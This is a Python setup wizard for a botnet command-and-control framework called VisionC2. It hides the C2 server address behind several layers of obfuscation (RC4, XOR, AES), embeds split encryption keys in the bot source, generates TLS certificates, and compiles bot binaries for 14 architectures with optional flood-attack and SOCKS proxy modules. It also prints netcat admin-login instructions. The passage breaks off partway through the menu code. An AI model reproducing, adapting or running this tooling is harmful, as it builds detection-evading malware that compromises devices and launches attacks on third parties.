#!/usr/bin/env python3
"""
VisionC2 - Interactive Setup Script
====================================
Automates the complete setup process:
- Generates random protocol version and magic code
- Obfuscates C2 address using XOR+Base64+SHA256+AES
- Generates TLS certificates
- Updates CNC and Bot source code
- Builds all components

Author: Syn2Much
"""

import os
import sys
import re
import random
import string
import base64
import subprocess
import shutil
from datetime import datetime


# ANSI Colors
class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"

    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_BLUE = "\033[94m"
    BRIGHT_MAGENTA = "\033[95m"
    BRIGHT_CYAN = "\033[96m"
    BRIGHT_WHITE = "\033[97m"


def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")


def print_banner():
    """Print the setup banner"""
    clear_screen()
    banner = f"""
{Colors.BRIGHT_RED}{Colors.BOLD}
    ██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗ ██████╗██████╗ 
    ██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚════██╗
    ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║██║      █████╔╝
    ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██║     ██╔═══╝ 
     ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║╚██████╗███████╗
      ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝
{Colors.RESET}
{Colors.BRIGHT_CYAN}              ═══════════════════════════════════════
                    {Colors.BRIGHT_YELLOW}Interactive Setup Wizard{Colors.BRIGHT_CYAN}
              ═══════════════════════════════════════{Colors.RESET}
"""
    print(banner)


def print_step(step_num: int, total: int, title: str):
    """Print a step header"""
    print(
        f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET} {Colors.BRIGHT_YELLOW}Step {step_num}/{total}:{Colors.RESET} {Colors.BRIGHT_WHITE}{title:<47}{Colors.RESET}{Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )


def success(msg: str):
    print(f"{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.GREEN}{msg}{Colors.RESET}")


def error(msg: str):
    print(f"{Colors.BRIGHT_RED}[✗]{Colors.RESET} {Colors.RED}{msg}{Colors.RESET}")


def info(msg: str):
    print(f"{Colors.BRIGHT_BLUE}[i]{Colors.RESET} {Colors.BLUE}{msg}{Colors.RESET}")


def warning(msg: str):
    print(f"{Colors.BRIGHT_YELLOW}[!]{Colors.RESET} {Colors.YELLOW}{msg}{Colors.RESET}")


def print_info_box(title: str, lines: list):
    """Print a styled information box"""
    width = 62
    print(f"\n{Colors.BRIGHT_BLUE}┌{'─' * width}┐{Colors.RESET}")
    print(
        f"{Colors.BRIGHT_BLUE}│{Colors.RESET} {Colors.BRIGHT_YELLOW}{title:<{width-1}}{Colors.RESET}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
    )
    print(f"{Colors.BRIGHT_BLUE}├{'─' * width}┤{Colors.RESET}")
    for line in lines:
        # Handle empty lines
        if not line:
            print(
                f"{Colors.BRIGHT_BLUE}│{Colors.RESET}{' ' * width}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
            )
        else:
            print(
                f"{Colors.BRIGHT_BLUE}│{Colors.RESET} {line:<{width-1}}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
            )
    print(f"{Colors.BRIGHT_BLUE}└{'─' * width}┘{Colors.RESET}\n")


def prompt(msg: str, default: str = None) -> str:
    """Get user input with styled prompt"""
    if default:
        display = f"{Colors.BRIGHT_MAGENTA}➜{Colors.RESET} {msg} [{Colors.DIM}{default}{Colors.RESET}]: "
    else:
        display = f"{Colors.BRIGHT_MAGENTA}➜{Colors.RESET} {msg}: "

    value = input(display).strip()
    return value if value else default


def confirm(msg: str, default: bool = True) -> bool:
    """Get yes/no confirmation"""
    default_str = "Y/n" if default else "y/N"
    response = (
        input(f"{Colors.BRIGHT_YELLOW}?{Colors.RESET} {msg} [{default_str}]: ")
        .strip()
        .lower()
    )

    if not response:
        return default
    return response in ["y", "yes"]


def generate_magic_code(length: int = 16) -> str:
    """Generate a random magic code with mixed characters"""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return "".join(random.choice(chars) for _ in range(length))


def generate_protocol_version() -> str:
    """Generate a random protocol version"""
    major = random.randint(1, 5)
    minor = random.randint(0, 9)
    patch = random.randint(0, 99)

    formats = [
        f"v{major}.{minor}",
        f"v{major}.{minor}.{patch}",
        f"proto{major}{minor}",
        f"V{major}_{minor}",
        f"r{major}.{minor}-stable",
    ]
    return random.choice(formats)


def generate_crypt_seed() -> str:
    """Generate random 8-char hex seed for encryption"""
    return "".join(random.choice("0123456789abcdef") for _ in range(8))


def derive_key_py(seed: str) -> bytes:
    """Python implementation of key derivation (must match Go charizard()).
    Uses first 16 bytes of the garuda key (charizard only uses the original 16 pokemon)."""
    import hashlib

    dk = garuda_key()[:16]

    h = hashlib.md5()
    h.update(seed.encode())
    h.update(dk)

    # Add time-invariant entropy
    entropy = bytearray([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
    for i in range(len(entropy)):
        entropy[i] ^= (len(seed) + i * 17) & 0xFF
    h.update(bytes(entropy))

    return h.digest()


# 16 function names in opsec.go order — used to read/write the AES key
KEY_FUNC_NAMES = [
    "mew", "mewtwo", "celebi", "jirachi", "shaymin", "phione",
    "manaphy", "victini", "keldeo", "meloetta", "genesect",
    "diancie", "hoopa", "volcanion", "magearna", "marshadow",
    "zeraora", "zarude", "regieleki", "regidrago", "glastrier",
    "spectrier", "calyrex", "wyrdeer", "kleavor", "ursaluna",
    "basculegion", "sneasler", "overqwil", "enamorus", "tinkaton",
    "annihilape",
]


def read_current_key(opsec_path: str) -> bytes:
    """Read the current 16-byte AES key from XOR byte pairs in opsec.go.
    Returns the derived key bytes (A^B for each function)."""
    with open(opsec_path, "r") as f:
        content = f.read()
    key_bytes = []
    for name in KEY_FUNC_NAMES:
        pattern = rf'func {name}\(\) byte\s*\{{\s*return byte\(0x([0-9A-Fa-f]+) \^ 0x([0-9A-Fa-f]+)\)'
        m = re.search(pattern, content)
        if not m:
            raise ValueError(f"Could not find XOR pair for {name}() in {opsec_path}")
        a, b = int(m.group(1), 16), int(m.group(2), 16)
        key_bytes.append(a ^ b)
    return bytes(key_bytes)


def garuda_key() -> bytes:
    """Return the raw 32-byte AES-256 key used by garuda() in opsec.go.
    Reads dynamically from opsec.go XOR byte pairs."""
    base_path = os.path.dirname(os.path.abspath(__file__))
    opsec_path = os.path.join(base_path, "bot", "opsec.go")
    return read_current_key(opsec_path)


def generate_random_key():
    """Generate a random 32-byte AES-256 key and XOR operand pairs that produce it.
    Returns (key_bytes, [(A1,B1), (A2,B2), ..., (A32,B32)])"""
    key_bytes = os.urandom(32)
    pairs = []
    for k in key_bytes:
        a = random.randint(0, 255)
        pairs.append((a, a ^ k))  # a ^ (a^k) = k
    return key_bytes, pairs


def patch_opsec_key(opsec_path: str, pairs: list):
    """Patch the XOR byte pairs in each of the 16 key functions in opsec.go."""
    with open(opsec_path, "r") as f:
        content = f.read()
    for i, name in enumerate(KEY_FUNC_NAMES):
        a, b = pairs[i]
        pattern = rf'(func {name}\(\) byte\s*\{{\s*return byte\()0x[0-9A-Fa-f]+ \^ 0x[0-9A-Fa-f]+(\))'
        replacement = rf'\g<1>0x{a:02X} ^ 0x{b:02X}\2'
        content = re.sub(pattern, replacement, content)
    with open(opsec_path, "w") as f:
        f.write(content)


def patch_crypto_tool_key(crypto_path: str, pairs: list):
    """Patch the key array in tools/crypto.go with the same XOR pairs."""
    with open(crypto_path, "r") as f:
        content = f.read()
    for i, name in enumerate(KEY_FUNC_NAMES):
        old_pattern = rf'(0x[0-9A-Fa-f]+ \^ 0x[0-9A-Fa-f]+,\s*// {name}\b)'
        a, b = pairs[i]
        # Match the existing line for this key function name
        new_val = f"0x{a:02X} ^ 0x{b:02X}, // {name}"
        content = re.sub(old_pattern, new_val, content)
    with open(crypto_path, "w") as f:
        f.write(content)


def aes_ctr_encrypt_with_key(plaintext_bytes: bytes, key: bytes) -> str:
    """AES-128-CTR encrypt, returns hex(IV || ciphertext)."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
    encryptor = cipher.encryptor()
    ct = encryptor.update(plaintext_bytes) + encryptor.finalize()
    return (iv + ct).hex()


def aes_ctr_decrypt_with_key(hex_blob: str, key: bytes) -> bytes:
    """AES-128-CTR decrypt from hex(IV || ciphertext)."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    data = bytes.fromhex(hex_blob)
    if len(data) <= 16:
        return b""
    iv = data[:16]
    ct = data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
    decryptor = cipher.decryptor()
    return decryptor.update(ct) + decryptor.finalize()


def encrypt_config_blobs(config_path: str, old_key: bytes, new_key: bytes):
    """Re-encrypt all raw hex blobs in config.go from old_key to new_key.
    1. Read each rawXxx hex blob
    2. Decrypt with old_key
    3. Re-encrypt with new_key
    4. Patch config.go with new hex blobs
    """
    with open(config_path, "r") as f:
        content = f.read()

    # Find all hex blob declarations: var rawXxx, _ = hex.DecodeString("...")
    pattern = r'(var raw\w+, _ = hex\.DecodeString\(")([0-9a-fA-F]*)("\))'

    def replace_blob(m):
        prefix = m.group(1)
        hex_blob = m.group(2)
        suffix = m.group(3)
        if not hex_blob:
            return m.group(0)  # skip empty blobs
        # Decrypt with old key, re-encrypt with new key
        plaintext = aes_ctr_decrypt_with_key(hex_blob, old_key)
        new_blob = aes_ctr_encrypt_with_key(plaintext, new_key)
        return prefix + new_blob + suffix

    content = re.sub(pattern, replace_blob, content)

    with open(config_path, "w") as f:
        f.write(content)


def aes_ctr_encrypt(plaintext: str) -> str:
    """AES-128-CTR encrypt a string using the garuda key.
    Returns hex string of IV || ciphertext (same format as tools/crypto.go)."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    key = garuda_key()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
    encryptor = cipher.encryptor()
    ct = encryptor.update(plaintext.encode()) + encryptor.finalize()
    return (iv + ct).hex()


def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    """RC4-like stream cipher (same as Go streamDecrypt)"""
    # Initialize S-box
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]

    # Generate keystream and encrypt
    result = bytearray(len(data))
    i, j = 0, 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        result[k] = data[k] ^ s[(s[i] + s[j]) % 256]

    return bytes(result)


def obfuscate_c2(c2_address: str, crypt_seed: str) -> str:
    """
    Multi-layer obfuscation matching Go decoder:
    1. Add MD5 checksum (4 bytes)
    2. Byte substitution
    3. RC4 stream encrypt
    4. XOR with derived key
    5. Base64 encode
    """
    import hashlib

    payload = c2_address.encode()

    # Add checksum (last 4 bytes of MD5)
    h = hashlib.md5()
    h.update(payload)
    checksum = h.digest()[:4]
    data = payload + checksum

    # Layer 4 (reverse): Byte substitution
    substituted = bytearray(len(data))
    for i in range(len(data)):
        b = data[i]
        b ^= 0xAA
        b = ((b >> 3) | (b << 5)) & 0xFF  # Rotate left 5
        substituted[i] = b

    # Layer 3 (reverse): RC4 stream encrypt
    key = derive_key_py(crypt_seed)
    rc4_encrypted = rc4_encrypt(bytes(substituted), key)

    # Layer 2 (reverse): XOR with rotating key
    xored = bytearray(len(rc4_encrypted))
    for i in range(len(rc4_encrypted)):
        xored[i] = rc4_encrypted[i] ^ key[i % len(key)]

    # Layer 1 (reverse): Base64 encode
    return base64.b64encode(bytes(xored)).decode()


def verify_obfuscation(encoded: str, crypt_seed: str, expected: str) -> bool:
    """Verify by simulating Go decoder"""
    import hashlib

    try:
        # Layer 1: Base64 decode
        layer1 = base64.b64decode(encoded)

        # Layer 2: XOR with rotating key
        key = derive_key_py(crypt_seed)
        layer2 = bytearray(len(layer1))
        for i in range(len(layer1)):
            layer2[i] = layer1[i] ^ key[i % len(key)]

        # Layer 3: RC4 decrypt
        layer3 = rc4_encrypt(bytes(layer2), key)  # RC4 is symmetric

        # Layer 4: Reverse byte substitution
        result = bytearray(len(layer3))
        for i in range(len(layer3)):
            b = layer3[i]
            b = ((b << 3) | (b >> 5)) & 0xFF  # Rotate right 5
            b ^= 0xAA
            result[i] = b

        # Verify checksum
        if len(result) < 5:
            return False

        payload = bytes(result[:-4])
        checksum = bytes(result[-4:])

        h = hashlib.md5()
        h.update(payload)
        expected_checksum = h.digest()[:4]

        if checksum != expected_checksum:
            return False

        return payload.decode() == expected
    except Exception as e:
        print(f"Verification error: {e}")
        return False


def update_cnc_main_go(
    cnc_path: str, magic_code: str, protocol_version: str, admin_port: str
):
    """Update the CNC main.go file with new values"""
    main_go_path = os.path.join(cnc_path, "main.go")

    with open(main_go_path, "r") as f:
        content = f.read()

    # Update MAGIC_CODE
    content = re.sub(
        r'MAGIC_CODE\s*=\s*"[^"]*"',
        lambda m: f'MAGIC_CODE       = "{magic_code}"',
        content,
    )

    # Update PROTOCOL_VERSION
    content = re.sub(
        r'PROTOCOL_VERSION\s*=\s*"[^"]*"',
        lambda m: f'PROTOCOL_VERSION = "{protocol_version}"',
        content,
    )

    # Update USER_SERVER_PORT
    content = re.sub(
        r'USER_SERVER_PORT\s*=\s*"[^"]*"',
        lambda m: f'USER_SERVER_PORT = "{admin_port}"',
        content,
    )

    with open(main_go_path, "w") as f:
        f.write(content)

    return True


def update_bot_debug_mode(bot_path: str, debug_enabled: bool) -> bool:
    """Update the debugMode variable in Bot config.go"""
    config_go_path = os.path.join(bot_path, "config.go")

    try:
        with open(config_go_path, "r") as f:
            content = f.read()

        debug_value = "true" if debug_enabled else "false"
        content = re.sub(
            r"var verboseLog\s*=\s*(true|false)",
            f"var verboseLog = {debug_value}",
            content,
        )

        with open(config_go_path, "w") as f:
            f.write(content)

        return True
    except Exception as e:
        error(f"Failed to update debug mode: {e}")
        return False


def caps_to_build_tags(cap_attacks: bool, cap_socks: bool) -> str:
    """Convert capability choices to Go build tags for the bot binary."""
    tags = []
    if cap_attacks:
        tags.append("withattacks")
    if cap_socks:
        tags.append("withsocks")
    return ",".join(tags)


def prompt_capabilities() -> tuple:
    """Prompt user to choose which modules to include in the bot build."""
    print(f"\n{Colors.BRIGHT_CYAN}⚙  Bot Module Selection{Colors.RESET}")
    print(f"{Colors.DIM}   Choose which capabilities to compile into bot binaries.{Colors.RESET}")
    print(f"{Colors.DIM}   Disabling a module removes its code paths from the bot.{Colors.RESET}\n")

    print(f"  {Colors.BRIGHT_RED}[1]{Colors.RESET} {Colors.BRIGHT_WHITE}Full (attacks + SOCKS){Colors.RESET}  — all modules enabled")
    print(f"  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} {Colors.BRIGHT_WHITE}Attacks only{Colors.RESET}          — no SOCKS proxy module")
    print(f"  {Colors.BRIGHT_BLUE}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}SOCKS only{Colors.RESET}             — no attack/flood module")
    print(f"  {Colors.DIM}[4]{Colors.RESET} {Colors.DIM}None{Colors.RESET}                    — shell/management only\n")

    choice = prompt("Select module profile", "1")
    if choice == "2":
        cap_attacks, cap_socks = True, False
        success("Module profile: Attacks only")
    elif choice == "3":
        cap_attacks, cap_socks = False, True
        success("Module profile: SOCKS only")
    elif choice == "4":
        cap_attacks, cap_socks = False, False
        warning("Module profile: None (shell/management only)")
    else:
        cap_attacks, cap_socks = True, True
        success("Module profile: Full (attacks + SOCKS)")
    return cap_attacks, cap_socks


def prompt_debug_mode() -> bool:
    """Prompt user to set debug mode with explanation"""
    print(f"\n{Colors.BRIGHT_CYAN}🔧 Debug Mode{Colors.RESET}")
    print(
        f"{Colors.DIM}   Logs function calls & connections to console (dev only){Colors.RESET}\n"
    )
    return confirm("Would you like to enable debug mode?", default=False)


def update_bot_main_go(
    bot_path: str,
    magic_code: str,
    protocol_version: str,
    obfuscated_c2: str,
    crypt_seed: str,
):
    """Update the Bot config.go file with new values"""
    config_go_path = os.path.join(bot_path, "config.go")

    with open(config_go_path, "r") as f:
        content = f.read()

    # Update rawServiceAddr (AES-encrypted obfuscated C2 — 6th layer)
    enc_service_addr = aes_ctr_encrypt(obfuscated_c2)
    content = re.sub(
        r'var rawServiceAddr, _ = hex\.DecodeString\("[^"]*"\)',
        lambda m: f'var rawServiceAddr, _ = hex.DecodeString("{enc_service_addr}")',
        content,
    )

    # Update configSeed
    content = re.sub(
        r'const configSeed\s*=\s*"[^"]*"',
        lambda m: f'const configSeed = "{crypt_seed}"',
        content,
    )

    # Update syncToken (magic code)
    content = re.sub(
        r'const syncToken\s*=\s*"[^"]*"',
        lambda m: f'const syncToken = "{magic_code}"',
        content,
    )

    # Update buildTag (protocol version)
    content = re.sub(
        r'const buildTag\s*=\s*"[^"]*"',
        lambda m: f'const buildTag = "{protocol_version}"',
        content,
    )

    with open(config_go_path, "w") as f:
        f.write(content)

    return True


def update_proxy_credentials(bot_path: str, username: str, password: str):
    """Update the default SOCKS5 proxy credentials in bot/config.go"""
    config_go_path = os.path.join(bot_path, "config.go")

    with open(config_go_path, "r") as f:
        content = f.read()

    content = re.sub(
        r'var proxyUser\s*=\s*"[^"]*"',
        lambda m: f'var proxyUser = "{username}"',
        content,
    )
    content = re.sub(
        r'var proxyPass\s*=\s*"[^"]*"',
        lambda m: f'var proxyPass = "{password}"',
        content,
    )

    with open(config_go_path, "w") as f:
        f.write(content)


def update_relay_config(base_path: str, magic_code: str):
    """Update the relay server's baked-in auth key"""
    relay_main = os.path.join(base_path, "cnc", "relay", "main.go")
    if not os.path.exists(relay_main):
        return

    with open(relay_main, "r") as f:
        content = f.read()

    content = re.sub(
        r'var defaultAuthKey\s*=\s*"[^"]*"',
        lambda m: f'var defaultAuthKey = "{magic_code}"',
        content,
    )

    with open(relay_main, "w") as f:
        f.write(content)


def update_cnc_relay_endpoints(cnc_path: str, relay_endpoints: list):
    """Patch baked-in relay endpoints into cnc/main.go so the web panel can list them."""
    main_go = os.path.join(cnc_path, "main.go")
    with open(main_go, "r") as f:
        content = f.read()
    # Comma-separated host:port list (or empty string)
    value = ",".join(relay_endpoints) if relay_endpoints else ""
    content = re.sub(
        r'var bakedRelayEndpoints\s*=\s*"[^"]*"',
        f'var bakedRelayEndpoints = "{value}"',
        content,
    )
    with open(main_go, "w") as f:
        f.write(content)


def update_cnc_proxy_credentials(cnc_path: str, proxy_user: str, proxy_pass: str):
    """Patch default SOCKS5 proxy credentials into cnc/main.go for web panel pre-fill."""
    main_go = os.path.join(cnc_path, "main.go")
    with open(main_go, "r") as f:
        content = f.read()
    content = re.sub(
        r'var bakedProxyUser\s*=\s*"[^"]*"',
        f'var bakedProxyUser = "{proxy_user}"',
        content,
    )
    content = re.sub(
        r'var bakedProxyPass\s*=\s*"[^"]*"',
        f'var bakedProxyPass = "{proxy_pass}"',
        content,
    )
    with open(main_go, "w") as f:
        f.write(content)


def update_relay_endpoints(bot_path: str, enc_hex: str):
    """Update the relay endpoints encrypted blob in bot/config.go"""
    config_go_path = os.path.join(bot_path, "config.go")

    with open(config_go_path, "r") as f:
        content = f.read()

    content = re.sub(
        r'var rawRelayEndpoints, _ = hex\.DecodeString\("[^"]*"\)',
        lambda m: f'var rawRelayEndpoints, _ = hex.DecodeString("{enc_hex}")',
        content,
    )

    with open(config_go_path, "w") as f:
        f.write(content)


def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
    """Generate TLS certificates"""
    try:
        key_path = os.path.join(cnc_path, "./certificates/server.key")
        cert_path = os.path.join(cnc_path, "./certificates/server.crt")

        # Find a valid openssl.cnf — musl-cross toolchains point to nonexistent paths
        ssl_env = dict(os.environ)
        for cnf in ["/etc/ssl/openssl.cnf", "/usr/lib/ssl/openssl.cnf"]:
            if os.path.isfile(cnf):
                ssl_env["OPENSSL_CONF"] = cnf
                break

        # Generate private key
        info("Generating 4096-bit RSA private key...")
        subprocess.run(
            ["openssl", "genrsa", "-out", key_path, "4096"],
            check=True,
            capture_output=True,
            env=ssl_env,
        )

        # Generate certificate
        info("Generating self-signed certificate...")
        subject = f"/C={cert_config['country']}/ST={cert_config['state']}/L={cert_config['city']}/O={cert_config['org']}/CN={cert_config['cn']}"

        subprocess.run(
            [
                "openssl",
                "req",
                "-new",
                "-x509",
                "-sha256",
                "-key",
                key_path,
                "-out",
                cert_path,
                "-days",
                str(cert_config["days"]),
                "-subj",
                subject,
            ],
            check=True,
            capture_output=True,
            env=ssl_env,
        )

        return True
    except subprocess.CalledProcessError as e:
        stderr_msg = e.stderr.decode().strip() if e.stderr else ""
        error(f"Failed to generate certificates: {e}")
        if stderr_msg:
            error(f"OpenSSL error: {stderr_msg}")
        return False
    except FileNotFoundError:
        error("OpenSSL not found. Please install: apt install openssl")
        return False


def find_go() -> str:
    """Find the Go binary, preferring /usr/local/go/bin/go over system PATH"""
    candidates = ["/usr/local/go/bin/go", shutil.which("go")]
    for go in candidates:
        if go and os.path.isfile(go):
            try:
                result = subprocess.run(
                    [go, "version"], capture_output=True, text=True
                )
                if result.returncode == 0:
                    return go
            except Exception:
                continue
    return "go"  # fallback


def build_cnc(cnc_path: str) -> bool:
    """Build the CNC server"""
    try:
        go = find_go()
        info(f"Building CNC server... ({go})")
        env = dict(os.environ)
        env["CGO_ENABLED"] = "0"
        result = subprocess.run(
            [go, "build", "-ldflags=-s -w", "-o", "cnc", "."],
            cwd=cnc_path,
            capture_output=True,
            text=True,
            env=env,
        )

        if result.returncode != 0:
            error(f"Build failed: {result.stderr}")
            return False

        # Copy binary to main directory as 'server'
        base_path = os.path.dirname(cnc_path)
        src = os.path.join(cnc_path, "cnc")
        dst = os.path.join(base_path, "server")
        shutil.copy2(src, dst)
        info(f"Copied CNC binary to {dst}")

        return True
    except FileNotFoundError:
        error("Go not found. Please install Go 1.24+")
        return False


def build_relay(base_path: str) -> bool:
    """Build the relay server"""
    try:
        go = find_go()
        info(f"Building relay server... ({go})")
        relay_path = os.path.join(base_path, "cnc", "relay")
        dst = os.path.join(base_path, "relay_server")
        env = dict(os.environ)
        env["CGO_ENABLED"] = "0"
        result = subprocess.run(
            [
                go,
                "build",
                "-trimpath",
                "-ldflags=-s -w -buildid=",
                "-o",
                dst,
                ".",
            ],
            cwd=relay_path,
            capture_output=True,
            text=True,
            env=env,
        )

        if result.returncode != 0:
            error(f"Build failed: {result.stderr}")
            return False

        info(f"Built relay binary to {dst}")
        return True
    except FileNotFoundError:
        error("Go not found. Please install Go 1.24+")
        return False


def build_bots(base_path: str, build_tags: str = "") -> bool:
    """Build bot binaries using tools/build.sh from project root"""
    try:
        build_script = os.path.join(base_path, "tools", "build.sh")

        # Make build.sh executable
        os.chmod(build_script, 0o755)

        info("Building bot binaries for 14 architectures...")
        info("This may take a few minutes...")
        print()

        env = dict(os.environ)
        if build_tags:
            env["BOT_BUILD_TAGS"] = build_tags
            info(f"Build tags: {build_tags}")

        result = subprocess.run(["bash", build_script], cwd=base_path, text=True, env=env)

        return result.returncode == 0
    except Exception as e:
        error(f"Build failed: {e}")
        return False




def save_config(base_path: str, config: dict):
    """Save configuration to a file for reference"""
    config_path = os.path.join(base_path, "setup_config.txt")

    with open(os.open(config_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600), "w") as f:
        f.write("=" * 60 + "\n")
        f.write("VisionC2 Configuration\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")

        f.write("[C2 Server]\n")
        f.write(f"C2 Address: {config['c2_address']}\n")
        f.write(f"Admin Port: {config['admin_port']}\n")
        f.write(f"Bot Port: 443\n\n")

        f.write("[Security]\n")
        f.write(f"Magic Code: {config['magic_code']}\n")
        f.write(f"Protocol Version: {config['protocol_version']}\n")
        f.write(f"Crypt Seed: {config['crypt_seed']}\n")
        f.write(f"Obfuscated C2: {config['obfuscated_c2']}\n\n")

        f.write("[Proxy]\n")
        f.write(f"Proxy User: {config.get('proxy_user', '')}\n")
        f.write(f"Proxy Pass: {config.get('proxy_pass', '')}\n\n")

        f.write("[Modules]\n")
        f.write(f"Attacks: {'true' if config.get('cap_attacks', True) else 'false'}\n")
        f.write(f"Socks: {'true' if config.get('cap_socks', True) else 'false'}\n\n")

        f.write("[Certificate]\n")
        f.write(f"Country: {config['cert']['country']}\n")
        f.write(f"State: {config['cert']['state']}\n")
        f.write(f"City: {config['cert']['city']}\n")
        f.write(f"Organization: {config['cert']['org']}\n")
        f.write(f"Common Name: {config['cert']['cn']}\n")
        f.write(f"Valid Days: {config['cert']['days']}\n\n")

        f.write("[Usage]\n")
        f.write("1. Start CNC (TUI mode):   ./server\n")
        f.write("2. Start CNC (split mode): ./server --split\n")
        f.write(
            f"3. Connect Admin (split mode): nc {config['c2_address'].split(':')[0]} {config['admin_port']}\n"
        )
        f.write("4. Login trigger (split mode): spamtec\n")
        f.write("5. Bot binaries: bins/\n")
        f.write("\n")
        f.write("[Modes]\n")
        f.write(
            "TUI Mode (default): Local interactive terminal UI, no telnet server needed\n"
        )
        f.write(
            "Split Mode (--split): Starts telnet admin server for multi-user remote access\n"
        )

    return config_path


def print_summary(config: dict):
    """Print final setup summary with all configuration details"""
    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ SETUP COMPLETE!{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")

    print(
        f"  {Colors.YELLOW}C2 Address:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('c2_address', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Admin Port:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('admin_port', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('magic_code', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Protocol:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config.get('protocol_version', 'N/A')}{Colors.RESET}"
    )
    print(
        f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET} {Colors.DIM}Managed via CNC dashboard — add with: !socks <relay:port> or the SOCKS tab{Colors.RESET}"
    )
    proxy_u = config.get("proxy_user", "")
    proxy_p = config.get("proxy_pass", "")
    print(
        f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}      {Colors.BRIGHT_WHITE}{proxy_u}:{proxy_p}{Colors.RESET}"
    )
    print()

    print(f"{Colors.BRIGHT_CYAN}  Quick Start:{Colors.RESET}")
    print(
        f"    TUI Mode:     {Colors.GREEN}./server{Colors.RESET}           (local interactive UI)"
    )
    print(
        f"    Split Mode:   {Colors.GREEN}./server --split{Colors.RESET}   (multi-user telnet)"
    )
    c2_ip = config.get("c2_address", "localhost:443").split(":")[0]
    admin_port = config.get("admin_port", "420")
    print(
        f"    Admin Login:  {Colors.GREEN}nc {c2_ip} {admin_port}{Colors.RESET}  (split mode only)"
    )
    print(
        f"    Login Trigger:{Colors.GREEN} spamtec{Colors.RESET}            (split mode only)"
    )
    print(f"    Bot bins:     {Colors.GREEN}bins/{Colors.RESET}")
    magic = config.get("magic_code", "<magic_code>")
    print(
        f"    Relay:        {Colors.GREEN}go build -o relay ./cnc/relay && ./relay -key {magic}{Colors.RESET}"
    )
    print()


def get_current_config(bot_path: str, cnc_path: str) -> dict:
    """Extract current configuration from source files"""
    config = {}

    # Read bot/config.go
    bot_config = os.path.join(bot_path, "config.go")
    if os.path.exists(bot_config):
        with open(bot_config, "r") as f:
            content = f.read()

            # Extract syncToken (magic code)
            match = re.search(r'const syncToken\s*=\s*"([^"]*)"', content)
            if match:
                config["magic_code"] = match.group(1)

            # Extract buildTag (protocol version)
            match = re.search(r'const buildTag\s*=\s*"([^"]*)"', content)
            if match:
                config["protocol_version"] = match.group(1)

            # Extract configSeed
            match = re.search(r'const configSeed\s*=\s*"([^"]*)"', content)
            if match:
                config["crypt_seed"] = match.group(1)

    # Read cnc/main.go for admin port
    cnc_main = os.path.join(cnc_path, "main.go")
    if os.path.exists(cnc_main):
        with open(cnc_main, "r") as f:
            content = f.read()

            match = re.search(r'USER_SERVER_PORT\s*=\s*"([^"]*)"', content)
            if match:
                config["admin_port"] = match.group(1)

    return config


def print_menu():
    """Print the main menu"""
    print(
        f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                 {Colors.BRIGHT_YELLOW}Select Setup Mode{Colors.RESET}                          {Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╠══════════════════════════════════════════════════════════════╣{Colors.RESET}"
    )
    print(
